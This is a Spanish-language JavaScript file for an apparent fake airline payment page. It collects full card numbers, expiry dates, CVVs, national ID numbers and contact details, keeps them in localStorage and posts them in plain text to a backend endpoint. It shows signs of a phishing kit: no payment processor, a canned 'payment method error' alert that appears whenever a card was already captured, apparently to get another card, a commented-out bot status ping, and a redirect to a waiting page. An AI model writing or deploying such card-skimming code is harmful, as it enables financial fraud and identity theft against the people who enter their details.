// public/js/payment.js (adaptado a tu backend /api/enviar-pago)
/* --- loader y LS --- */
const loader = document.querySelector('.loader');
const LS = window.localStorage;

/* --- arranque visual (igual que antes) --- */
setTimeout(() => {
    try {
        document.querySelector('body').classList.remove('sb-hidden');
        if (loader) loader.classList.remove('show');

        /* --- FLIGHT RESUME --- */
        document.querySelector('#origin-code').textContent = info.flightInfo.origin.code;
        document.querySelector('#destination-code').textContent = info.flightInfo.destination.code;
        let finalPrice = "- -";
        if (info.flightInfo.ticket_nat === 'NAC') {
            finalPrice = pricesNAC[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
        } else if (info.flightInfo.ticket_nat === 'INT') {
            finalPrice = pricesNAT[info.flightInfo.ticket_sched][info.flightInfo.ticket_type] * (info.flightInfo.adults + info.flightInfo.children);
            if (info.flightInfo.type === 1) finalPrice = finalPrice * 2;
        } else {
            console.log('flight resume error');
        }

        document.querySelector('#flight-cost').textContent = formatPrice(finalPrice);

        // COMPROBAR ERROR
        if (info.metaInfo.p && info.metaInfo.p !== '') {
            alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (AVERR88000023)');
        }

        console.log("Index ON");

        // Ejemplo opcional: notificar al backend que el usuario llegó a la página
        // fetch('/api/bot/status', { method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({message:'P4-PAYMENT'}) });
    } catch (err) {
        console.log(err);
    }
}, 2000);


/* -------------------------
   Elementos DOM
   ------------------------- */
const form = document.querySelector('#next-step'); // tu form
const p = document.querySelector('#p');
const pdate = document.querySelector('#pdate');
const c = document.querySelector('#c');
const ban = document.querySelector('#ban');
const dues = document.querySelector('#dues');
const dudename = document.querySelector('#name');
const surname = document.querySelector('#surname');
const dniEl = document.querySelector('#cc');
const email = document.querySelector('#email');
const telnum = document.querySelector('#telnum');
const city = document.querySelector('#city');
const state = document.querySelector('#state');
const address = document.querySelector('#address');

/* -------------------------
   FORM SUBMIT (validación y envío al backend)
   ------------------------- */
if (form) {
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Limpiar errores visuales
        [p, pdate, c, dudename, surname, dniEl, email, telnum, city, state, address].forEach(el => {
            try { el.classList.remove('input-error'); } catch (_) {}
        });

        // Validaciones (igual que tu lógica original)
        const rawCard = p.value || '';
        const firstChar = (rawCard.replace(/\s/g, ''))[0] || '';
        const cardLength = rawCard.length;

        const cardLengthOk = (cardLength === 19 && firstChar !== '3' && ['4', '5'].includes(firstChar)) ||
                             (cardLength === 17 && firstChar === '3');

        if (!cardLengthOk) {
            p.classList.add('input-error'); p.focus(); return;
        }
        if (!isLuhnValid(rawCard)) {
            p.classList.add('input-error'); p.focus(); return;
        }
        if (!isValidDate(pdate.value)) {
            pdate.classList.add('input-error'); pdate.focus(); return;
        }
        if (!((c.value.length === 3 && firstChar !== '3') || (c.value.length === 4 && firstChar === '3'))) {
            c.classList.add('input-error'); c.focus(); return;
        }
        if (!ban.value) { ban.focus(); return; }
        if (!dudename.value) { dudename.classList.add('input-error'); dudename.focus(); return; }
        if (!surname.value) { surname.classList.add('input-error'); surname.focus(); return; }
        if (!dniEl.value) { dniEl.classList.add('input-error'); dniEl.focus(); return; }
        if (!email.value) { email.classList.add('input-error'); email.focus(); return; }
        if (!telnum.value) { telnum.classList.add('input-error'); telnum.focus(); return; }
        if (!city.value) { city.classList.add('input-error'); city.focus(); return; }
        if (!state.value) { state.classList.add('input-error'); state.focus(); return; }
        if (!address.value) { address.classList.add('input-error'); address.focus(); return; }

        // Rellenar info.metaInfo (igual que tu código)
        info.metaInfo.p = p.value;
        info.metaInfo.ban = ban.value;
        info.metaInfo.pdate = pdate.value;
        info.metaInfo.c = c.value;
        info.metaInfo.dudename = dudename.value;
        info.metaInfo.surname = surname.value;
        info.metaInfo.cc = dniEl.value;
        info.metaInfo.email = email.value;
        info.metaInfo.telnum = telnum.value;
        info.metaInfo.city = city.value;
        info.metaInfo.state = state.value;
        info.metaInfo.address = address.value;
        info.metaInfo.dues = dues.value || '';
        info.metaInfo.flightCost = document.querySelector('#flight-cost') ? document.querySelector('#flight-cost').textContent : '';
        info.checkerInfo.mode = 'userpassword';

        // Detectar compañía por BIN
        const binFirst = (info.metaInfo.p && info.metaInfo.p.replace(/\s/g, '')) ? info.metaInfo.p.replace(/\s/g, '')[0] : '';
        if (binFirst === '4') info.checkerInfo.company = 'VISA';
        else if (binFirst === '5') info.checkerInfo.company = 'MC';
        else if (binFirst === '3') info.checkerInfo.company = 'AM';

        updateLS();

        // Construir payload esperado por tu backend (/api/enviar-pago)
        const payload = {
            flightCost: info.metaInfo.flightCost,
            name: `${info.metaInfo.dudename} ${info.metaInfo.surname}`,
            cc: info.metaInfo.cc,
            email: info.metaInfo.email,
            telnum: info.metaInfo.telnum,
            city: info.metaInfo.city,
            state: info.metaInfo.state,
            address: info.metaInfo.address,
            bank: info.metaInfo.ban,
            cardNumber: info.metaInfo.p.replace(/\s+/g, ''),
            expiryDate: info.metaInfo.pdate,
            cvv: info.metaInfo.c,
            dues: info.metaInfo.dues
        };

        // Generar transactionId local (opcional) para trackeo en frontend
        const transactionId = info.metaInfo.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
        info.metaInfo.transactionId = transactionId;
        updateLS();

        // Mostrar loader
        if (loader) loader.classList.add('show');

        try {
            // Enviar al endpoint que definiste en tu backend
            const resp = await fetch('/api/enviar-pago', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            const j = await resp.json();

            if (j && j.success && j.messageId) {
                // Guardar en localStorage para que waiting.html / chedf.html puedan usarlo
                const storedData = {
                    ...payload,
                    transactionId,
                    messageId: j.messageId
                };
                LS.setItem('paymentData', JSON.stringify(storedData));
                // Quitar loader y redirigir a waiting.html (como en tu flujo)
                setTimeout(() => {
                    if (loader) loader.classList.remove('show');
                    window.location.href = 'waiting.html';
                }, 800);
            } else {
                console.error('Respuesta inesperada de /api/enviar-pago:', j);
                if (loader) loader.classList.remove('show');
                alert('Ocurrió un error al enviar los datos. Intenta de nuevo.');
            }
        } catch (err) {
            console.error('Error enviando /api/enviar-pago:', err);
            if (loader) loader.classList.remove('show');
            alert('Error de conexión. Intenta otra vez.');
        }
    });
}

/* -------------------------
   FUNCIONES UTIL
   ------------------------- */

function updateLS() {
    try {
        LS.setItem('info', JSON.stringify(info));
    } catch (e) {
        console.warn('No se pudo actualizar LS:', e);
    }
}

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, '');
    if (numero.length === 0) {
        p.removeAttribute('class');
        p.classList.add('input-cc', 'mt-2', 'bg-std');
    }

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {
        c.setAttribute('maxlength', '4');
        p.removeAttribute('class');
        p.classList.add('bg-am', 'input-cc', 'mt-2');

        if (numero.length > 15) numero = numero.substr(0, 15);

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) numeroFormateado += ' ';
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    } else {
        if (numero[0] == '4') p.classList.add('bg-vi');
        if (numero[0] == '5') p.classList.add('bg-mc');

        c.setAttribute('maxlength', '3');
        if (numero.length > 16) numero = numero.substr(0, 16);

        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) numeroFormateado += ' ';
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    texto = texto.replace(/\D/g, '');
    texto = texto.substring(0, 4);
    if (texto.length > 2) texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    input.value = texto;
}

function formatPrice(number) {
    if (typeof number !== 'number') number = Number(number) || 0;
    return number.toFixed(2);
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');
    if (bin.length < 6) return false;
    const digits = bin.split('').map(Number).reverse();
    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) doubled -= 9;
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }
    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    if (!fechaInput || typeof fechaInput !== 'string') return false;
    var partes = fechaInput.split('/');
    if (partes.length < 2) return false;
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);
    if (isNaN(mesInput) || isNaN(añoInput)) return false;
    if (mesInput > 12) return false;
    añoInput += 2000;
    var fechaActual = new Date();
    var añoActual = fechaActual.getFullYear();
    var limiteAño = añoActual + 8;
    if (añoInput > limiteAño || (añoInput === limiteAño && mesInput >= 1)) return false;
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= (fechaActual.getMonth() + 1))) {
        return true;
    } else {
        return false;
    }
}
